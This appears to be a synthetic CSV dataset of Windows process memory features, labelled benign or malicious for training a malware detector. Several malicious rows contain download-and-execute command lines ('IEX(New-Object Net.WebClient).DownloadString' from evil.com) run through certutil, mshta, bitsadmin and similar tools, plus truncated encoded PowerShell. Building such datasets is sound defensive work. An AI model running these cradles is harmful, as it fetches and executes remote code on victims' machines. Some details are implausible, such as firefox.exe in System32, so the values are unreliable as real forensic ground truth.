process_name,pid,ppid,cmd_line,cmd_line_length,num_threads,num_handles,working_set_mb,private_bytes_mb,session_id,is_signed,num_loaded_dlls,has_network_conn,num_network_conns,writable_exec_sections,private_memory_ratio,heap_executable,vad_count,suspicious_parent,process_hollowing,dll_injection,reflective_load,encoded_powershell,lolbin_usage,wmi_execution,unusual_thread_start,yara_hits,memory_anomaly_score,label
explorer.exe,6494,1956,C:\Windows\System32\explorer.exe,76,3,172,88.0,117.19,1,0,4,1,3,1,0.796,1,167,1,1,0,0,0,0,0,1,2,0.7542,1
MsMpEng.exe,6193,6160,"""C:\Program Files\Windows Defender\MsMpEng.exe""",96,27,157,108.29,93.53,1,1,39,0,0,0,0.301,0,58,0,0,0,0,0,0,0,0,0,0.0113,0
System,4,8052,C:\Windows\System32\System,20,22,496,117.34,13.13,1,1,72,0,0,0,0.314,0,61,0,0,0,0,0,0,0,0,0,0.0933,0
winlogon.exe,6812,8390,C:\Windows\System32\winlogon.exe,78,28,198,27.88,44.38,1,1,5,0,0,0,0.061,0,109,0,0,0,0,0,0,0,0,0,0.1283,0
powershell.exe,797,5307,powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAY...c1octNSeBegIf9Ohzar+iNIrciIU0jJMsvHWemH=ZnLu6sG9oHdp+=ysv9ukF1XYnKXoa7bx321E7s=ynKqXgmyPkp/rdnF1E1Ed2Uo63xE2pU4opx=U,184,6,133,86.03,47.9,1,1,41,1,1,0,0.592,1,49,1,0,0,0,1,1,0,0,4,0.6339,1
MsMpEng.exe,9613,3662,"""C:\Program Files\Windows Defender\MsMpEng.exe""",53,15,87,189.97,67.07,1,1,18,0,0,0,0.185,0,74,0,0,0,0,0,0,0,0,0,0.1242,0
notepad.exe,3308,5407,C:\Windows\System32\notepad.exe,48,4,89,149.36,77.76,1,0,4,1,2,4,0.919,1,109,1,1,0,0,0,0,0,1,4,0.8049,1
svchost.exe,8344,4653,C:\Windows\system32\svchost.exe -k netsvcs,22,26,238,29.14,36.93,1,1,74,0,0,0,0.059,0,24,0,0,0,0,0,0,0,0,0,0.1484,0
explorer.exe,4886,3592,C:\Windows\Explorer.EXE,94,5,52,72.16,48.15,0,1,6,0,0,0,0.307,0,69,0,0,0,0,0,0,0,0,0,0.1156,0
notepad.exe,4498,1195,C:\Windows\System32\notepad.exe,65,20,195,96.48,97.82,0,1,40,0,0,0,0.089,0,40,0,0,0,0,0,0,0,0,0,0.1418,0
taskmgr.exe,5913,6057,C:\Windows\System32\taskmgr.exe,25,21,60,28.78,55.51,1,1,60,0,0,0,0.303,0,39,0,0,0,0,0,0,0,0,0,0.1253,0
SearchIndexer.exe,5843,4027,C:\Windows\System32\SearchIndexer.exe,49,32,148,10.73,75.53,1,1,50,0,0,0,0.245,0,55,0,0,0,0,0,0,0,0,0,0.0771,0
powershell.exe,501,6388,powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA...D5mCWEKOwsZhwIx1KGSGz0l58k58wsPnhrHV8PP80fA9vPLy80V4v2y+KxAPWqvkZ4ooBiMKZc5/lgAH1Lj3=m/VmrDySWTRW+dQodW6WwoNbv1R+cJK3g+LBot45Zu9g8Prt8=V5k3o+,229,4,84,56.34,36.61,1,1,59,1,2,0,0.803,0,103,0,0,0,0,1,1,0,0,2,0.6371,1
OneDrive.exe,9733,9563,C:\Windows\System32\OneDrive.exe,101,29,216,31.42,92.11,0,1,56,0,0,0,0.065,0,113,0,0,0,0,0,0,0,0,0,0.1192,0
calc.exe,3534,5527,C:\Windows\System32\calc.exe,52,3,102,187.44,54.83,1,1,63,0,0,0,0.138,0,81,0,0,0,0,0,0,0,0,0,0.0096,0
services.exe,5907,2681,C:\Windows\System32\services.exe,70,28,286,105.49,65.45,1,1,61,0,0,0,0.08,0,111,0,0,0,0,0,0,0,0,0,0.0474,0
winlogon.exe,4923,1157,C:\Windows\System32\winlogon.exe,110,31,478,48.36,78.02,0,1,54,0,0,0,0.107,0,28,0,0,0,0,0,0,0,0,0,0.0683,0
wininit.exe,2826,3440,C:\Windows\System32\wininit.exe,32,6,70,139.51,26.09,0,1,49,0,0,0,0.247,0,109,0,0,0,0,0,0,0,0,0,0.1248,0
firefox.exe,1144,3085,C:\Windows\System32\firefox.exe,61,1,310,94.74,85.13,0,1,43,1,9,0,0.114,0,79,0,0,0,0,0,0,0,0,0,0.0277,0
powershell.exe,6182,3007,powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAY...vEPUQtfJPrwdFKvBWVzuGXvER1OD7RyeyXR408v1eIuZiaoq5XjlM=r4/Vzsr09cAB9oif10Gx13OZx,147,5,35,54.23,37.65,1,1,42,1,3,2,0.624,0,104,0,0,0,0,1,1,0,0,3,0.76,1
explorer.exe,6207,5623,C:\Windows\Explorer.EXE,46,29,177,33.0,36.1,0,1,26,0,0,0,0.259,0,97,0,0,0,0,0,0,0,0,0,0.0999,0
wmiprvse.exe,8584,1045,wmiprvse.exe -secured -Embedding,44,10,251,90.07,30.41,1,1,38,1,2,3,0.612,0,120,1,0,0,0,0,0,1,0,3,0.7495,1
MsMpEng.exe,5506,7528,"""C:\Program Files\Windows Defender\MsMpEng.exe""",69,8,490,190.36,14.45,1,1,75,0,0,0,0.228,0,115,0,0,0,0,0,0,0,0,0,0.0962,0
System,4,413,C:\Windows\System32\System,65,17,411,165.98,14.16,1,1,70,0,0,0,0.131,0,43,0,0,0,0,0,0,0,0,0,0.0249,0
cscript.exe,5420,1304,cscript.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),106,1,147,11.58,39.57,1,1,37,1,4,0,0.688,0,36,1,0,0,0,0,1,0,0,1,0.6598,1
OneDrive.exe,2778,3844,C:\Windows\System32\OneDrive.exe,40,34,331,114.51,19.02,0,1,59,0,0,0,0.227,0,27,0,0,0,0,0,0,0,0,0,0.0654,0
conhost.exe,7472,9363,C:\Windows\System32\conhost.exe,106,21,267,190.26,79.92,1,1,71,0,0,0,0.166,0,62,0,0,0,0,0,0,0,0,0,0.0229,0
explorer.exe,5308,9741,C:\Windows\Explorer.EXE,112,33,211,50.7,20.64,1,1,31,0,0,0,0.299,0,55,0,0,0,0,0,0,0,0,0,0.1293,0
conhost.exe,4877,3862,C:\Windows\System32\conhost.exe,51,9,208,128.92,97.21,0,1,10,0,0,0,0.125,0,44,0,0,0,0,0,0,0,0,0,0.0209,0
taskmgr.exe,5453,7206,C:\Windows\System32\taskmgr.exe,51,10,345,55.73,6.96,0,1,9,0,0,0,0.225,0,100,0,0,0,0,0,0,0,0,0,0.1273,0
lsass.exe,3856,8272,C:\Windows\System32\lsass.exe,96,7,334,68.28,11.03,0,1,59,0,0,0,0.108,0,70,0,0,0,0,0,0,0,0,0,0.0951,0
conhost.exe,4733,9580,C:\Windows\System32\conhost.exe,36,30,145,37.04,33.15,0,1,34,0,0,0,0.222,0,67,0,0,0,0,0,0,0,0,0,0.1255,0
System,4,7772,C:\Windows\System32\System,111,6,139,190.96,81.15,1,1,30,0,0,0,0.302,0,101,0,0,0,0,0,0,0,0,0,0.052,0
powershell.exe,9993,7307,powershell.exe -e JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtA...a6NXMF7c9Rr7gEAH4AU8xZLkPHuQ/1=rh9gOGV/HpAwyLmROmJo5Zf8Ng0843p1wUS/1Pf7amIIBZlGzuEbitnt6vvI,174,9,54,30.13,77.85,1,1,39,1,4,1,0.653,1,121,0,0,0,0,1,1,0,0,3,0.8653,1
svchost.exe,3942,4100,wmiprvse.exe -secured -Embedding,32,8,139,72.71,19.19,1,1,26,1,0,2,0.595,0,164,0,0,0,0,0,0,1,0,1,0.5144,1
csrss.exe,5556,3227,C:\Windows\System32\csrss.exe,103,38,338,36.28,4.2,0,1,64,0,0,0,0.1,0,70,0,0,0,0,0,0,0,0,0,0.1406,0
wininit.exe,7536,4423,C:\Windows\System32\wininit.exe,100,26,345,46.33,74.31,1,1,51,0,0,0,0.344,0,43,0,0,0,0,0,0,0,0,0,0.0342,0
powershell.exe,5914,8255,powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA...0dmfiaX8FNWYt34QpMXUjZVD9JlXx/Tb2b3Rd1VY2Tx8ecUZOyJTfjNf2oD1vStDCzKiarsWrbKY+0tJzfiPilOp=aW831COiQfQwtO0zlvgYADtrf1DtqKBe,209,7,192,82.68,39.1,1,1,56,1,1,1,0.602,0,73,0,0,0,0,1,1,0,0,4,0.8245,1
conhost.exe,7238,9884,C:\Windows\System32\conhost.exe,111,23,398,188.31,88.75,0,1,65,0,0,0,0.283,0,53,0,0,0,0,0,0,0,0,0,0.0143,0
cscript.exe,906,4817,cscript.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),93,4,114,17.39,18.3,1,1,25,1,3,1,0.466,1,101,1,0,0,0,1,1,0,0,4,0.829,1
MsMpEng.exe,4006,8482,"""C:\Program Files\Windows Defender\MsMpEng.exe""",27,20,372,105.2,79.48,0,1,27,0,0,0,0.111,0,53,0,0,0,0,0,0,0,0,0,0.0615,0
spoolsv.exe,466,2607,C:\Windows\System32\spoolsv.exe,46,18,268,23.18,78.58,0,1,36,0,0,0,0.233,0,49,0,0,0,0,0,0,0,0,0,0.094,0
conhost.exe,9481,6722,C:\Windows\System32\conhost.exe,38,38,422,102.3,36.54,1,1,78,0,0,0,0.092,0,89,0,0,0,0,0,0,0,0,0,0.131,0
calc.exe,4107,9793,C:\Windows\System32\calc.exe,41,38,403,198.98,86.43,0,1,6,0,0,0,0.125,0,62,0,0,0,0,0,0,0,0,0,0.1231,0
bitsadmin.exe,8381,5626,bitsadmin.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),223,5,42,56.84,45.53,1,1,20,1,4,1,0.536,1,44,1,0,0,0,0,1,0,0,2,0.7937,1
MsMpEng.exe,6962,4798,"""C:\Program Files\Windows Defender\MsMpEng.exe""",106,26,281,122.02,95.93,1,1,71,0,0,0,0.27,0,70,0,0,0,0,0,0,0,0,0,0.1058,0
winlogon.exe,5066,9127,C:\Windows\System32\winlogon.exe,42,21,433,119.93,56.95,0,1,60,0,0,0,0.158,0,97,0,0,0,0,0,0,0,0,0,0.0373,0
smss.exe,6107,4,C:\Windows\System32\smss.exe,115,11,382,43.29,78.3,0,1,20,0,0,0,0.057,0,74,0,0,0,0,0,0,0,0,0,0.1183,0
SearchIndexer.exe,6017,5210,C:\Windows\System32\SearchIndexer.exe,117,14,81,19.83,17.02,0,1,42,0,0,0,0.167,0,92,0,0,0,0,0,0,0,0,0,0.0322,0
RuntimeBroker.exe,7815,1097,C:\Windows\System32\RuntimeBroker.exe,97,11,157,23.67,66.1,0,1,27,0,0,0,0.278,0,98,0,0,0,0,0,0,0,0,0,0.0474,0
wininit.exe,4218,4980,C:\Windows\System32\wininit.exe,29,16,247,189.19,38.14,0,1,62,0,0,0,0.212,0,62,0,0,0,0,0,0,0,0,0,0.0481,0
powershell.exe,3244,4539,powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAY...AfdN7txxGvOrz/cgJJccODvAZbfXTK7hNZUOnlqnbBB=a7kykBRb3oWAB3jS9t1nzdS6EeSLbi0TTCPtHDEl7QO3ZkH+WPJ11O0oT+bGtqCl,176,2,40,87.98,11.63,1,1,53,1,2,2,0.596,1,82,0,0,0,0,1,1,0,0,2,0.728,1
msiexec.exe,1656,8866,msiexec.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),113,3,40,74.53,17.85,1,1,31,1,3,2,0.601,0,71,1,0,0,0,1,1,0,0,3,0.5468,1
lsass.exe,5032,2687,C:\Windows\System32\lsass.exe,88,20,114,55.7,98.01,0,1,20,0,0,0,0.268,0,45,0,0,0,0,0,0,0,0,0,0.0426,0
calc.exe,1433,8003,C:\Windows\System32\calc.exe,115,19,261,149.51,38.22,0,1,37,0,0,0,0.151,0,66,0,0,0,0,0,0,0,0,0,0.1071,0
taskmgr.exe,5371,2608,C:\Windows\System32\taskmgr.exe,77,25,304,112.28,30.74,1,1,50,0,0,0,0.181,0,23,0,0,0,0,0,0,0,0,0,0.0322,0
winlogon.exe,9916,771,C:\Windows\System32\winlogon.exe,101,5,398,66.91,19.28,1,1,59,0,0,0,0.191,0,53,0,0,0,0,0,0,0,0,0,0.144,0
System,4,4927,C:\Windows\System32\System,103,25,317,30.4,81.7,1,1,7,0,0,0,0.129,0,36,0,0,0,0,0,0,0,0,0,0.1001,0
winlogon.exe,4721,639,C:\Windows\System32\winlogon.exe,71,24,135,178.14,45.72,1,1,67,0,0,0,0.066,0,101,0,0,0,0,0,0,0,0,0,0.0002,0
certutil.exe,5013,1879,certutil.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),281,5,84,23.18,31.58,1,1,26,1,3,2,0.547,0,105,1,0,0,0,1,1,0,0,3,0.6605,1
cscript.exe,6156,3340,cscript.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),129,4,142,32.49,10.71,1,1,39,1,3,0,0.43,1,72,1,0,0,0,1,1,0,0,2,0.8487,1
explorer.exe,9971,442,C:\Windows\Explorer.EXE,54,35,280,136.82,22.06,0,1,64,0,0,0,0.19,0,32,0,0,0,0,0,0,0,0,0,0.0581,0
explorer.exe,2107,5332,C:\Windows\System32\explorer.exe,42,12,378,105.62,68.72,1,0,97,0,5,5,0.721,1,154,0,0,1,1,0,0,0,0,2,0.7971,1
OneDrive.exe,9469,6321,C:\Windows\System32\OneDrive.exe,77,5,53,158.27,42.65,0,1,41,0,0,0,0.154,0,89,0,0,0,0,0,0,0,0,0,0.0698,0
calc.exe,4646,592,C:\Windows\System32\calc.exe,52,16,392,125.76,18.82,1,1,34,0,0,0,0.181,0,30,0,0,0,0,0,0,0,0,0,0.0847,0
conhost.exe,8614,6884,C:\Windows\System32\conhost.exe,107,21,404,77.17,98.01,0,1,71,0,0,0,0.14,0,44,0,0,0,0,0,0,0,0,0,0.0505,0
spoolsv.exe,417,604,C:\Windows\System32\spoolsv.exe,69,8,187,151.08,84.68,1,1,31,0,0,0,0.068,0,62,0,0,0,0,0,0,0,0,0,0.1109,0
taskmgr.exe,7840,8366,C:\Windows\System32\taskmgr.exe,85,22,184,8.21,62.34,1,1,71,0,0,0,0.056,0,65,0,0,0,0,0,0,0,0,0,0.0374,0
RuntimeBroker.exe,4994,5741,C:\Windows\System32\RuntimeBroker.exe,92,30,464,98.94,60.16,1,1,15,0,0,0,0.086,0,113,0,0,0,0,0,0,0,0,0,0.0176,0
mshta.exe,8017,4719,mshta.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),183,2,123,48.2,38.94,1,1,16,1,4,2,0.781,1,118,1,0,0,0,1,1,0,0,1,0.8124,1
MsMpEng.exe,9866,4566,"""C:\Program Files\Windows Defender\MsMpEng.exe""",112,32,163,82.66,17.21,0,1,24,0,0,0,0.285,0,94,0,0,0,0,0,0,0,0,0,0.0205,0
notepad.exe,562,3128,C:\Windows\System32\notepad.exe,56,10,384,51.77,51.36,1,1,17,0,0,0,0.164,0,114,0,0,0,0,0,0,0,0,0,0.1314,0
OneDrive.exe,3430,4869,C:\Windows\System32\OneDrive.exe,47,39,133,104.88,47.11,0,1,24,0,0,0,0.194,0,24,0,0,0,0,0,0,0,0,0,0.1439,0
taskmgr.exe,1530,4613,C:\Windows\System32\taskmgr.exe,80,10,413,64.36,55.63,1,1,30,0,0,0,0.342,0,85,0,0,0,0,0,0,0,0,0,0.0684,0
spoolsv.exe,4047,8675,C:\Windows\System32\spoolsv.exe,52,33,68,31.39,69.34,1,1,5,0,0,0,0.209,0,70,0,0,0,0,0,0,0,0,0,0.106,0
mspaint.exe,2788,7971,C:\Windows\System32\mspaint.exe,41,6,162,105.45,91.78,1,0,11,1,2,1,0.848,1,66,1,1,0,0,0,0,0,1,3,0.9895,1
svchost.exe,2156,3636,C:\Windows\system32\svchost.exe -k netsvcs,46,17,67,40.18,93.26,0,1,60,0,0,0,0.119,0,101,0,0,0,0,0,0,0,0,0,0.1423,0
winlogon.exe,5839,4177,C:\Windows\System32\winlogon.exe,86,12,284,76.01,60.18,1,1,76,0,0,0,0.286,0,45,0,0,0,0,0,0,0,0,0,0.0499,0
powershell.exe,8462,5658,powershell.exe -e JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtA...lhsiTfp3yZ7h9aUTEwN8ChK8OvGD+PSlSMLZI9S5fmDJPU+MJFrn,135,9,141,59.05,12.95,1,1,43,1,5,1,0.725,1,51,1,0,0,0,1,1,0,0,4,0.7494,1
cmd.exe,3682,7212,cmd.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),214,4,137,43.38,23.96,1,1,39,1,2,1,0.478,0,86,1,0,0,0,0,1,0,0,4,0.5191,1
RuntimeBroker.exe,4890,8885,C:\Windows\System32\RuntimeBroker.exe,95,10,235,72.72,16.25,1,1,40,0,0,0,0.079,0,30,0,0,0,0,0,0,0,0,0,0.0989,0
RuntimeBroker.exe,8453,1555,C:\Windows\System32\RuntimeBroker.exe,61,8,297,164.55,48.19,0,1,54,0,0,0,0.127,0,26,0,0,0,0,0,0,0,0,0,0.1206,0
calc.exe,2236,4851,C:\Windows\System32\calc.exe,69,1,335,138.37,41.56,0,1,65,0,0,0,0.102,0,103,0,0,0,0,0,0,0,0,0,0.0021,0
notepad.exe,6530,5745,C:\Windows\System32\notepad.exe,67,4,53,48.99,34.79,1,0,3,1,8,4,0.602,1,65,1,1,0,0,0,0,0,1,3,0.7942,1
svchost.exe,4352,4107,C:\Windows\System32\svchost.exe,56,5,247,245.42,155.66,1,0,142,0,0,7,0.725,1,149,0,0,1,0,0,0,0,0,3,0.8001,1
explorer.exe,2898,3442,C:\Windows\System32\explorer.exe,42,7,87,148.62,108.21,1,0,11,1,1,3,0.648,1,60,1,1,0,0,0,0,0,1,2,0.7096,1
wmiprvse.exe,7790,8481,wmiprvse.exe -secured -Embedding,39,7,228,118.21,80.8,1,1,47,0,2,1,0.498,1,60,1,0,0,0,0,0,1,0,2,0.6052,1
smss.exe,788,4,C:\Windows\System32\smss.exe,26,32,292,173.95,90.73,1,1,54,0,0,0,0.233,0,53,0,0,0,0,0,0,0,0,0,0.0913,0
lsass.exe,7447,6320,C:\Windows\System32\lsass.exe,29,12,61,183.41,31.48,1,1,54,0,0,0,0.347,0,82,0,0,0,0,0,0,0,0,0,0.0788,0
SearchIndexer.exe,9929,2345,C:\Windows\System32\SearchIndexer.exe,75,39,265,9.0,86.77,1,1,60,0,0,0,0.051,0,56,0,0,0,0,0,0,0,0,0,0.0761,0
wininit.exe,7452,8665,C:\Windows\System32\wininit.exe,71,7,420,116.82,20.5,1,1,14,0,0,0,0.206,0,96,0,0,0,0,0,0,0,0,0,0.098,0
powershell.exe,2639,7268,powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAY...Lm3dVUZTASPhTw69nCo9t=gC3LeaUMk0qboKxq1XtUPFMMRtSVjY/mvq8Wo1bNk+a,133,2,40,96.53,57.65,1,1,35,1,3,1,0.79,1,77,0,0,0,0,1,1,0,0,4,0.8744,1
explorer.exe,2400,6251,C:\Windows\System32\explorer.exe,38,3,170,102.1,103.17,1,0,5,1,8,1,0.752,1,172,1,1,0,0,0,0,0,1,2,0.9764,1
RuntimeBroker.exe,3527,2465,C:\Windows\System32\RuntimeBroker.exe,25,29,354,95.74,89.81,0,1,8,0,0,0,0.152,0,64,0,0,0,0,0,0,0,0,0,0.051,0
powershell.exe,2633,4102,powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAY...vNKsmYFG=TFLH+LFhp629wh/Pv7so+inHrEjBUEfywDvaKHafAapFCZi46kK8W3OJkfCdn1=IkR+fBxzQ6f,151,3,83,63.81,75.34,1,1,39,1,4,2,0.511,1,96,0,0,0,0,1,1,0,0,2,0.6834,1
wininit.exe,8211,1544,C:\Windows\System32\wininit.exe,21,7,213,85.44,1.51,1,1,54,0,0,0,0.186,0,111,0,0,0,0,0,0,0,0,0,0.1431,0
powershell.exe,5054,8731,powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA...1AV1aKZPeu7HZVWx4WqnOTDjvitthwl/CDQf9eBRNo78Il59sEuQmbhtbAc1PXCx7cTx+DCQ=VSKma2UxL7D7KzOBtdIwppz1beoUiNGfRS,195,8,187,59.97,16.47,1,1,39,1,2,0,0.817,1,129,1,0,0,0,1,1,0,0,4,0.7026,1
cmd.exe,6686,1798,cmd.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),180,4,90,68.34,48.37,1,1,31,1,4,0,0.456,1,72,1,0,0,0,1,1,0,0,4,0.7394,1
explorer.exe,4417,4667,C:\Windows\Explorer.EXE,41,4,105,185.33,1.88,1,1,50,0,0,0,0.334,0,60,0,0,0,0,0,0,0,0,0,0.0791,0
services.exe,6685,1332,C:\Windows\System32\services.exe,100,36,251,12.47,61.8,1,1,45,0,0,0,0.215,0,97,0,0,0,0,0,0,0,0,0,0.1475,0
svchost.exe,3449,1918,wmiprvse.exe -secured -Embedding,40,9,107,63.98,15.26,1,1,33,1,2,2,0.554,1,121,1,0,0,0,0,0,1,0,3,0.8302,1
firefox.exe,6069,2478,C:\Windows\System32\firefox.exe,33,17,245,18.81,36.1,0,1,21,0,18,0,0.314,0,93,0,0,0,0,0,0,0,0,0,0.1071,0
conhost.exe,8869,3584,C:\Windows\System32\conhost.exe,47,1,247,61.29,37.24,1,1,22,0,0,0,0.279,0,25,0,0,0,0,0,0,0,0,0,0.0747,0
svchost.exe,5513,7799,C:\Windows\System32\svchost.exe,60,4,91,78.64,49.79,1,0,8,1,4,3,0.802,1,60,1,1,0,0,0,0,0,1,3,0.7425,1
spoolsv.exe,5166,6777,C:\Windows\System32\spoolsv.exe,85,18,258,79.15,42.8,0,1,8,0,0,0,0.131,0,107,0,0,0,0,0,0,0,0,0,0.1341,0
services.exe,3004,1603,C:\Windows\System32\services.exe,20,2,364,160.78,71.91,1,1,54,0,0,0,0.262,0,94,0,0,0,0,0,0,0,0,0,0.1087,0
SearchIndexer.exe,2616,1693,C:\Windows\System32\SearchIndexer.exe,105,25,124,60.31,99.0,0,1,52,0,0,0,0.241,0,64,0,0,0,0,0,0,0,0,0,0.1453,0
SearchIndexer.exe,1759,4545,C:\Windows\System32\SearchIndexer.exe,66,22,335,125.08,29.58,1,1,15,0,0,0,0.338,0,76,0,0,0,0,0,0,0,0,0,0.0794,0
powershell.exe,3489,1318,powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAY...Yo=Yg0bdbkozQfp7yp+RtwM8xBNLIL0lvLAJ=jJhyoJNt8e6rxLXAIA/Sq8ZTFG6JiI6JHVnynwOdNTZglSCBxgYe7lO,160,7,86,83.61,36.04,1,1,51,1,3,0,0.678,1,118,0,0,0,0,1,1,0,0,4,0.8305,1
services.exe,3528,5563,C:\Windows\System32\services.exe,58,27,285,72.81,45.09,0,1,65,0,0,0,0.175,0,99,0,0,0,0,0,0,0,0,0,0.0425,0
explorer.exe,4356,6569,C:\Windows\System32\explorer.exe,32,14,352,244.65,86.09,1,0,76,1,5,2,0.649,1,208,0,0,1,0,0,0,0,0,1,0.6362,1
smss.exe,9470,4,C:\Windows\System32\smss.exe,108,3,64,198.93,36.77,1,1,7,0,0,0,0.1,0,114,0,0,0,0,0,0,0,0,0,0.0232,0
OneDrive.exe,1665,4704,C:\Windows\System32\OneDrive.exe,93,4,226,41.6,62.5,1,1,47,0,0,0,0.165,0,63,0,0,0,0,0,0,0,0,0,0.0224,0
smss.exe,3741,4,C:\Windows\System32\smss.exe,33,25,353,136.84,7.87,1,1,38,0,0,0,0.173,0,63,0,0,0,0,0,0,0,0,0,0.0334,0
mspaint.exe,4871,6526,C:\Windows\System32\mspaint.exe,52,7,72,126.35,53.53,1,0,10,1,2,4,0.797,1,57,1,1,0,0,0,0,0,1,2,0.8186,1
notepad.exe,7750,5067,C:\Windows\System32\notepad.exe,28,34,314,104.03,84.81,1,1,7,0,0,0,0.283,0,49,0,0,0,0,0,0,0,0,0,0.1261,0
wininit.exe,3956,9302,C:\Windows\System32\wininit.exe,21,26,376,141.91,73.99,1,1,28,0,0,0,0.317,0,34,0,0,0,0,0,0,0,0,0,0.0189,0
System,4,3405,C:\Windows\System32\System,113,6,73,39.4,23.97,0,1,78,0,0,0,0.325,0,100,0,0,0,0,0,0,0,0,0,0.0609,0
System,4,9041,C:\Windows\System32\System,67,18,285,138.71,48.35,0,1,9,0,0,0,0.202,0,42,0,0,0,0,0,0,0,0,0,0.1333,0
OneDrive.exe,7399,9565,C:\Windows\System32\OneDrive.exe,80,10,93,38.52,8.13,1,1,50,0,0,0,0.252,0,118,0,0,0,0,0,0,0,0,0,0.1066,0
powershell.exe,4545,8429,powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA...G79tQ=CGUrK/WU7gIEpod7TFEZvLH/T3vk3nyuylVXHcpEua3NPOMJDT89Da5J00KsCCmXW/=MikRdXB6OxgPKnu9Bno0hWdTG6bEYxLu0EQ=W605Pk6QxDgJjt8XnRUtgEZnEcSE0sZiNWQowx,235,2,183,37.36,73.1,1,1,23,1,4,0,0.842,0,54,0,0,0,0,1,1,0,0,2,0.6309,1
svchost.exe,2677,4721,C:\Windows\System32\svchost.exe,60,3,179,28.58,65.78,1,0,5,1,1,4,0.776,1,130,1,1,0,0,0,0,0,1,2,0.7702,1
explorer.exe,7395,7949,C:\Windows\Explorer.EXE,99,32,476,156.94,33.13,0,1,13,0,0,0,0.13,0,112,0,0,0,0,0,0,0,0,0,0.0206,0
MsMpEng.exe,9403,2853,"""C:\Program Files\Windows Defender\MsMpEng.exe""",63,8,60,61.06,25.89,1,1,33,0,0,0,0.247,0,91,0,0,0,0,0,0,0,0,0,0.0677,0
powershell.exe,3736,4750,powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA...UUCv/Fojyur0nk1TvvJe1cpEH7pKfmgHOUR3JU/+TEFgdI9IbSjzPUUjO,145,8,170,20.53,74.06,1,1,24,1,2,0,0.637,0,49,1,0,0,0,1,1,0,0,4,0.6721,1
calc.exe,3291,5077,C:\Windows\System32\calc.exe,45,7,160,48.03,53.07,1,0,10,1,2,4,0.629,1,57,1,1,0,0,0,0,0,1,3,0.8461,1
MsMpEng.exe,9419,3034,"""C:\Program Files\Windows Defender\MsMpEng.exe""",109,9,491,63.66,90.29,0,1,59,0,0,0,0.334,0,99,0,0,0,0,0,0,0,0,0,0.0978,0
firefox.exe,2739,7207,C:\Windows\System32\firefox.exe,65,29,150,169.47,58.18,1,1,44,1,17,0,0.254,0,55,0,0,0,0,0,0,0,0,0,0.1156,0
